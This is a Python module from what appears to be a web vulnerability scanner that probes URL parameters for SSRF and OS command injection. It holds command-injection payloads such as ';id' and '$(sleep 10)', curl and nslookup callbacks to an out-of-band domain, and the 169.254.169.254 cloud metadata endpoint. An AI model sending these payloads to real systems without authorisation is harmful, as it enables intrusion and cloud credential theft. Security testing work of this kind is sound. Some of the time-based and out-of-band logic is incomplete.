# path: core/scanners/rce_ssrf.py

import aiohttp
import aiohttp.client_exceptions
import asyncio
import random
import re
import hashlib
import math
import os
from typing import Callable, Tuple, Optional, Dict, List

# YENİ: OOBListener'ı dahil et
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from core.oob_listener import OOBListener
    from core.engine import SynaraScannerEngine

from urllib.parse import urlparse, urlunparse, parse_qs, urlencode

from core.scanners.base_scanner import BaseScanner

class RCE_SSRFScanner(BaseScanner):
    """
    [AR-GE v2.0 - FP-ZERO]
    Yeni Nesil SSRF / RCE Tarayıcı (Yüksek Güvenilirlik Filtreli)
    --------------------------------------------------------------
    AMAÇ:
      - Kör (Blind) RCE ve SSRF zafiyetlerini OOB (Out-of-Band) etkileşim ile %100 doğrulamak.
      - **FP (False Positive) oranını minimuma indirmek** için Baseline karşılaştırmasını güçlendirmek (Akıllı Boyut/Entropy Analizi).
    """

    # ----------------------
    # Sabitler / Ayarlar
    # ----------------------

    # SSRF hedefleri (kısıtlı set – körlemesine tarama yok)
    SSRF_TARGETS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://169.254.169.254/latest/meta-data/",
    ]

    # AWS / GCP / genel metadata anahtar kelimeleri
    METADATA_KEYWORDS = [
        "ami-id",
        "instance-id",
        "meta-data",
        "iam/security-credentials",
        "computeMetadata",
        "metadata-flavor",
        "google.internal",
    ]
    
    # YENİ: Gürültü yapan parametreler (Ignored Params)
    # Bu parametrelere SSRF/RCE payload'u atmak genelde anlamsızdır ve logları kirletir.
    IGNORED_PARAMS = {
        "color", "background", "bg", "width", "height", "align", "valign",
        "style", "class", "font", "size", "margin", "padding", "border",
        "direction", "lang", "type", "encoding", "quality", "mode", "theme",
        
        # Playtika Optimizasyonu: Yaygın güvenlik token/nonce parametreleri
        "csrf_token", "nonce", "_token", "_nonce", "token", "xsrf", "authenticity_token", "x-csrf-token" 
    }

    # İç servis / admin panel keyword'leri
    INTERNAL_SERVICE_KEYWORDS = [
        "jenkins",
        "grafana",
        "kibana",
        "prometheus",
        "admin console",
        "internal only",
        "for internal use only",
    ]

    # CDN / WAF / generic hata sayfalarında geçen, SSRF sayılmaması gereken pattern'ler
    BLOCKING_KEYWORDS = [
        "cloudflare",
        "google frontend",
        "google front end",
        "request error",
        "error 400",
        "400 bad request",
        "403 forbidden",
        "not allowed",
        "invalid url",
        "access denied",
        "request blocked",
        "invalid url",
    ]

    # RCE başarı pattern'leri (klasik çıktılar)
    RCE_PATTERNS = [
        re.compile(r"root:x:0:0"),          # /etc/passwd
        re.compile(r"uid=\d+"),             # id çıktısı
        re.compile(r"\[fonts\]"),           # win.ini
        re.compile(r"\[extensions\]"),      # win.ini
    ]

    # Echo tabanlı RCE payload şablonları (token ile doldurulur)
    RCE_ECHO_TEMPLATES = [
        ";echo {token}",
        "||echo {token}",
        "&echo {token}",
        "|echo {token}",
    ]

    # Klasik RCE komut payload'ları (bash/cmd)
    RCE_SIMPLE_PAYLOADS = [
        ";id",
        "||id",
        "&whoami",
        "&&whoami",
    ]

    # OOB Etkileşim için sabitler (YENİ FAZ 25)
    OOB_DOMAIN_BASE = "synara.oob.platform.com" 
    OOB_RCE_PAYLOADS = [
        ";nslookup {token}.{oob_domain}",
        "|nslookup {token}.{oob_domain}",
        "&&nslookup {token}.{oob_domain}",
        ";curl http://{token}.{oob_domain}", 
        "|curl http://{token}.{oob_domain}",
    ]
    
    # Time-Based RCE Payloadları
    TIME_RCE_PAYLOADS = [
        ";sleep 10",
        "|sleep 10",
        "&&sleep 10",
        "`sleep 10`",
        "$(sleep 10)"
    ]

    # Eş zamanlılık limiti (SSRF + RCE için)
    CONCURRENCY_LIMIT = 10

    # Tek istek için hard timeout (sn)
    TIMEOUT = 12

    # Çok gürültülü ortamlarda (yüksek jitter) SSRF risk skorunu bastırmak için
    HIGH_VARIANCE_THRESHOLD = 0.80

    def __init__(self, logger, results_callback, request_callback: Callable[[], None], oob_listener_instance: Optional['OOBListener'] = None):
        super().__init__(logger, results_callback, request_callback)
        # Kalibrasyon verileri (engine tarafından set ediliyor)
        self.calibration_latency_ms = 4000
        self.latency_cv = 0.0
        self.calibration_headers = {}
        # YENİ: OOB Listener referansı
        self.oob_listener = oob_listener_instance

    @property
    def name(self):
        return "SSRF/RCE Tarayıcı (Filtreli)"

    @property
    def category(self):
        return "SSRF_RCE"

    # ----------------------
    # ANA GİRİŞ NOKTASI
    # ----------------------
    async def scan(
        self,
        url: str,
        session: aiohttp.ClientSession,
        completed_callback: Callable[[], None],
    ):
        self.log(f"[{self.category}] Tarama başlatıldı (Akıllı Filtre Aktif).", "INFO")

        try:
            # 1) Çok gürültülü ortamda SSRF'nin güvenilir olmadığını belirt
            if self.latency_cv > self.HIGH_VARIANCE_THRESHOLD:
                self.add_result(
                    self.category,
                    "WARNING",
                    f"Sunucu yanıt varyansı çok yüksek (CV={self.latency_cv:.2f}). "
                    f"Time-based SSRF sinyalleri güvenilir olmayabilir.",
                    0,
                )

            # 2) Anti-bot / rate-limit header'ları varsa SSRF sonuçlarını agresif yorumlama
            for h_name in ["X-RateLimit-Limit", "Retry-After", "CF-RAY"]:
                if self.calibration_headers.get(h_name):
                    self.add_result(
                        self.category,
                        "WARNING",
                        f"Anti-Bot başlığı '{h_name}' tespit edildi. SSRF sonuçları temkinli yorumlanmalı.",
                        0,
                    )
                    break

            parsed = urlparse(url)
            base_query = parse_qs(parsed.query)

            # Pre-Scan tarafından bulunan parametreler
            discovered = getattr(self, "discovered_params", set())
            params = set(base_query.keys()) | set(discovered)

            # URL'de olmayan ama keşfedilen parametrelere default değer ver
            for p in discovered:
                if p not in base_query:
                    base_query[p] = ["SYNARA_SSRF_TEST"]
                    params.add(p)
            
            # --- FİLTRELEME İŞLEMİ (V17.1) ---
            # Görsel/CSS/TOKEN parametrelerini ayıkla
            filtered_params = {p for p in params if p.lower() not in self.IGNORED_PARAMS}
            ignored_count = len(params) - len(filtered_params)
            
            if ignored_count > 0:
                self.log(f"[{self.category}] {ignored_count} adet görsel/gereksiz/token parametre tarama dışı bırakıldı (Gürültü Azaltma).", "INFO")

            if not filtered_params:
                self.add_result(
                    self.category,
                    "INFO",
                    "INFO: SSRF/RCE için uygun parametre bulunamadı.",
                    0,
                )
                completed_callback()
                return

            # 3) Baseline yanıtını al (SSRF tespitinde fark analizi için)
            baseline_status, baseline_len, baseline_body, baseline_entropy = await self._fetch_baseline(
                url, session
            )

            semaphore = asyncio.Semaphore(self.CONCURRENCY_LIMIT)
            tasks = []

            # ---- SSRF Testleri ----
            for p in filtered_params:
                for target in self.SSRF_TARGETS:
                    tasks.append(
                        self._test_ssrf(
                            base_url=url,
                            param=p,
                            target=target,
                            session=session,
                            parsed=parsed,
                            base_query=base_query,
                            semaphore=semaphore,
                            baseline_status=baseline_status,
                            baseline_len=baseline_len,
                            baseline_body=baseline_body,
                            baseline_entropy=baseline_entropy,
                        )
                    )

            # ---- RCE Testleri (echo + klasik) ----
            for p in filtered_params:
                # Echo tabanlı payload'lar
                for template in self.RCE_ECHO_TEMPLATES:
                    tasks.append(
                        self._test_rce_echo(
                            base_url=url,
                            param=p,
                            template=template,
                            session=session,
                            parsed=parsed,
                            base_query=base_query,
                            semaphore=semaphore,
                        )
                    )

                # Klasik id / whoami payload'ları
                for payload in self.RCE_SIMPLE_PAYLOADS:
                    tasks.append(
                        self._test_rce_classic(
                            base_url=url,
                            param=p,
                            payload=payload,
                            session=session,
                            parsed=parsed,
                            base_query=base_query,
                            semaphore=semaphore,
                        )
                    )
                
                # ---- OOB RCE Testleri (Blind Confirmation) ----
                for template in self.OOB_RCE_PAYLOADS:
                    token = hashlib.sha1(os.urandom(10)).hexdigest()[:12]
                    payload = template.format(token=token, oob_domain=self.OOB_DOMAIN_BASE)
                    
                    test_query = dict(base_query)
                    test_query[p] = [payload]
                    new_parts = list(parsed)
                    new_parts[4] = urlencode(test_query, doseq=True)
                    test_url = urlunparse(new_parts)

                    # KRİTİK: Token'ı Listener'a kaydet
                    if self.oob_listener:
                        self.oob_listener.add_token(token)

                    tasks.append(
                        self._send_request(test_url, p, token, "OOB", semaphore, session, method="HEAD")
                    )

            self.log(
                f"[{self.category}] Toplam {len(tasks)} SSRF/RCE/OOB testi yürütülecek (Limit: {self.CONCURRENCY_LIMIT}).",
                "INFO",
            )

            if tasks:
                # KRİTİK DÜZELTME: Tüm görevleri burada await ediyoruz.
                await asyncio.gather(*tasks)

        except Exception as e:
            msg = f"Kritik Hata: {type(e).__name__} ({e})"
            self.log(f"[{self.category}] {msg}", "CRITICAL")
            self.add_result(
                self.category,
                "CRITICAL",
                msg,
                self._calculate_score_deduction("CRITICAL"),
            )

        completed_callback()

    # ----------------------
    # Baseline Yardımcı
    # ----------------------
    async def _fetch_baseline(
        self, url: str, session: aiohttp.ClientSession
    ):
        try:
            # Jitter ve Throttle uygula
            if hasattr(self, '_apply_jitter_and_throttle'):
                await self._apply_jitter_and_throttle()
            await asyncio.sleep(random.uniform(0.05, 0.2))
            
            self.request_callback()

            async with session.get(
                url,
                allow_redirects=True,
                timeout=aiohttp.ClientTimeout(total=self.TIMEOUT),
            ) as res:
                text = await res.text()
                status = res.status
                length = len(text)
                entropy = self._shannon_entropy_approx(text)
                return status, length, text, entropy

        except Exception as e:
            self.log(
                f"[{self.category}] Baseline alınamadı: {type(e).__name__} ({e})",
                "WARNING",
            )
            return None, None, "", 0.0

    @staticmethod
    def _shannon_entropy_approx(text: str) -> float: # İsim netleştirildi
        """Basit (Approximate) Shannon Entropy hesaplaması (0.0-1.0 arası)."""
        if not text:
            return 0.0
        unique_chars = len(set(text))
        return unique_chars / max(len(text), 1)

    # ----------------------
    # SSRF Test Mantığı (FP-Zero)
    # ----------------------
    async def _test_ssrf(
        self,
        base_url: str,
        param: str,
        target: str,
        session: aiohttp.ClientSession,
        parsed,
        base_query,
        semaphore: asyncio.Semaphore,
        baseline_status,
        baseline_len,
        baseline_body: str,
        baseline_entropy: float,
    ):
        async with semaphore:
            test_query = dict(base_query)
            test_query[param] = [target]

            new_parts = list(parsed)
            new_parts[4] = urlencode(test_query, doseq=True)
            test_url = urlunparse(new_parts)

            try:
                # Jitter ve Throttle uygula
                if hasattr(self, '_apply_jitter_and_throttle'):
                    await self._apply_jitter_and_throttle()
                await asyncio.sleep(random.uniform(0.1, 0.3))
                self.request_callback()

                async with session.get(
                    test_url,
                    allow_redirects=True,
                    timeout=aiohttp.ClientTimeout(total=self.TIMEOUT),
                ) as res:
                    text = await res.text()
                    status = res.status
                    low = text.lower()
                    length = len(text)
                    entropy = self._shannon_entropy_approx(text)

                    if status >= 500: return # 5xx hatalarını yoksay

                    for bad in self.BLOCKING_KEYWORDS:
                        if bad in low: return # WAF/CDN hatalarını yoksay

                    # A) KRİTİK: Metadata/Internal Keyword Tespiti (En Güvenilir)
                    for key in self.METADATA_KEYWORDS:
                        if key in low:
                            self.add_result(
                                self.category,
                                "CRITICAL",
                                f"SSRF TESPİTİ! Param: '{param}', Hedef: {target} → Metadata içeriği tespit edildi.",
                                self._calculate_score_deduction("CRITICAL"),
                            )
                            return

                    if baseline_len is None or baseline_status is None: return

                    # B) AKILLI HEURISTIC SCORING (FP-Zero İçin)
                    score = 0.0
                    length_diff_ratio = abs(length - baseline_len) / max(baseline_len, 1)
                    
                    # 1. Uzunluk Değişimi (Shrinkage en önemli sinyal)
                    is_shrinkage = (length < baseline_len) and (length_diff_ratio > 0.40) # %40'tan fazla küçülme
                    is_expansion = (length > baseline_len) and (length_diff_ratio > 1.0) # %100'den fazla büyüme

                    if is_shrinkage: score += 1.5
                    elif is_expansion: score += 0.5 # Büyüme daha az güvenilir (genel hata mesajı olabilir)
                    
                    # 2. Status Değişimi (Anlamlı olmalı)
                    status_changed = (status != baseline_status)
                    # Sadece 400/404/301 gibi genel hatalara dönüşmedikçe puan ver.
                    is_meaningful_status_change = status_changed and status not in [400, 404, 301]
                    if is_meaningful_status_change: score += 1.0

                    # 3. Internal Hit (Çok güçlü sinyal)
                    internal_hit = any(k in low for k in self.INTERNAL_SERVICE_KEYWORDS)
                    if internal_hit: score += 2.0
                    
                    # 4. Entropy Değişimi (Sayısal veya B64 çıktı sinyali)
                    entropy_delta = abs(entropy - baseline_entropy)
                    if entropy_delta >= 0.20: score += 0.5
                    
                    # 5. Gürültü Düşürme (Yüksek CV varsa skoru düşür)
                    if self.latency_cv > self.HIGH_VARIANCE_THRESHOLD: score *= 0.7

                    # FİNAL KARAR: 3.0 ve üzeri çok yüksek şüphedir.
                    if score >= 3.0:
                        level = "WARNING"
                        msg = f"SSRF ŞÜPHESİ: İç servise benzeyen yanıt tespit edildi — Param: '{param}', Target: {target} (Skor={score:.2f}, Diff: {length_diff_ratio*100:.0f}%)"
                        self.add_result(self.category, level, msg, self._calculate_score_deduction(level))

            except (asyncio.TimeoutError, aiohttp.client_exceptions.ClientConnectorError):
                return
            except Exception as e:
                self.log(f"[{self.category}] SSRF test hatası ({param}): {type(e).__name__}", "WARNING")

    # ----------------------
    # RCE Test Mantığı — Echo Tabanlı
    # ----------------------
    async def _test_rce_echo(
        self,
        base_url: str,
        param: str,
        template: str,
        session: aiohttp.ClientSession,
        parsed,
        base_query,
        semaphore: asyncio.Semaphore,
    ):
        async with semaphore:
            token = f"SYNARA_RCE_{random.randint(100000, 999999)}"
            payload = template.format(token=token)
            test_query = dict(base_query)
            prev = test_query.get(param, [""])[0]
            test_query[param] = [prev + payload]

            new_parts = list(parsed)
            new_parts[4] = urlencode(test_query, doseq=True)
            test_url = urlunparse(new_parts)

            try:
                # Jitter ve Throttle uygula
                if hasattr(self, '_apply_jitter_and_throttle'):
                    await self._apply_jitter_and_throttle()
                await asyncio.sleep(random.uniform(0.1, 0.4))
                self.request_callback()

                async with session.get(
                    test_url,
                    allow_redirects=True,
                    timeout=aiohttp.ClientTimeout(total=self.TIMEOUT),
                ) as res:
                    text = await res.text()
                    low = text.lower()

                    if token.lower() in low:
                        self.add_result(
                            self.category,
                            "CRITICAL",
                            f"KRİTİK: RCE BAŞARISI (echo doğrulandı)! Param: '{param}', Payload: {payload}",
                            self._calculate_score_deduction("CRITICAL"),
                        )
            except: pass

    # ----------------------
    # RCE Test Mantığı — Klasik
    # ----------------------
    async def _test_rce_classic(
        self,
        base_url: str,
        param: str,
        payload: str,
        session: aiohttp.ClientSession,
        parsed,
        base_query,
        semaphore: asyncio.Semaphore,
    ):
        async with semaphore:
            test_query = dict(base_query)
            prev = test_query.get(param, [""])[0]
            test_query[param] = [prev + payload]
            new_parts = list(parsed)
            new_parts[4] = urlencode(test_query, doseq=True)
            test_url = urlunparse(new_parts)

            try:
                # Jitter ve Throttle uygula
                if hasattr(self, '_apply_jitter_and_throttle'):
                    await self._apply_jitter_and_throttle()
                await asyncio.sleep(random.uniform(0.1, 0.4))
                self.request_callback()

                async with session.get(
                    test_url,
                    allow_redirects=True,
                    timeout=aiohttp.ClientTimeout(total=self.TIMEOUT),
                ) as res:
                    text = await res.text()
                    low = text.lower()
                    for pat in self.RCE_PATTERNS:
                        if pat.search(low):
                            self.add_result(
                                self.category,
                                "CRITICAL",
                                f"KRİTİK: RCE BAŞARISI! Param: '{param}', Payload: {payload}",
                                self._calculate_score_deduction("CRITICAL"),
                            )
                            return
            except: pass

    async def _send_request(
        self,
        url: str,
        param: str,
        identifier: str,
        check_type: str,
        semaphore: asyncio.Semaphore,
        session: aiohttp.ClientSession,
        method: str = "GET",
        check_time: bool = False
    ):
        async with semaphore:
            try:
                # OOB kontrolü için ekstra kontrol
                if check_type == "OOB":
                    # 1. HİT durumunu kontrol et
                    if self.oob_listener and self.oob_listener.check_token_status(identifier) == "HIT":
                        # Zafiyet kanıtlandı
                        self.add_result(
                            self.category,
                            "CRITICAL",
                            f"KRİTİK: Blind RCE/SSRF kanıtlandı! OOB sinyali geri döndü. Param: '{param}', Token: {identifier}",
                            self._calculate_score_deduction("CRITICAL")
                        )
                        self.oob_listener.log(f"[{self.category}] OOB HIT DOĞRULANDI! Token: {identifier} - Param: {param}", "CRITICAL")
                        return # Kritik bulgu, çıkış yap

                    # 2. Gönderim işlemini yap
                    # Jitter ve Throttle uygula
                    if hasattr(self, '_apply_jitter_and_throttle'):
                        await self._apply_jitter_and_throttle()
                        
                    self.request_callback()
                    
                    if method == "HEAD":
                        await session.head(url, timeout=5)
                    else:
                        await session.get(url, timeout=15)
                        
                    self.oob_listener.log(
                             f"[{self.category}] OOB Sinyali Gönderildi: Param '{param}' -> Token '{identifier}'",
                             "INFO",
                    )
                    return # OOB Görevleri sadece sinyal yollayıp döner.

                # Normal request işlemleri
                start_time = asyncio.get_running_loop().time()
                self.request_callback()
                
                if method == "HEAD":
                    await session.head(url, timeout=5)
                else:
                    await session.get(url, timeout=15)
                
                end_time = asyncio.get_running_loop().time()
                duration = end_time - start_time
                
                # TIME-BASED KONTROLÜ (Bu blok şu an sadece placeholder olarak duruyor)
                if check_type == "TIME" and check_time:
                    if duration >= 9.5:
                         pass 

            except asyncio.TimeoutError:
                if check_type == "TIME" and check_time:
                    pass # Timeout durumunu pasif olarak tut
            except Exception as e:
                # OOB hatalarını her zaman loglama (gürültü olmasın diye)
                if check_type != "OOB":
                     pass